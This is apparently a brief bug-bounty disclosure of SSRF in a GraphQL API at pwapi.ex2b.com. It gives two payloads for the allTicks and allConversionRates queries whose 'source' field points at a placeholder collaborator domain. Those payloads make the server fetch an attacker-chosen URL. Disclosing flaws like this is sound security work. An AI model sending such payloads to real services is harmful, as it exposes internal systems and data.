### SSRF in graphQL query (pwapi.ex2b.com)

1. Attacker injected the payload on graphQL source

```
query { allTicks(symbol:"TSLA", source:"https://[COLLABORATOR_DOMAIN]/") {   symbol   server   source   ask   time   bid   } }
```

The query allConversionRates was vulnerable to SSRF attack as well.

```
query { allConversionRates(server:"test", ticks:true, source:"https://[COLLABORATOR_DOMAIN]/", from:"USD", to:"EUR", ts:1334) { ticks { ask { symbol } } multiplier error from to }}
```
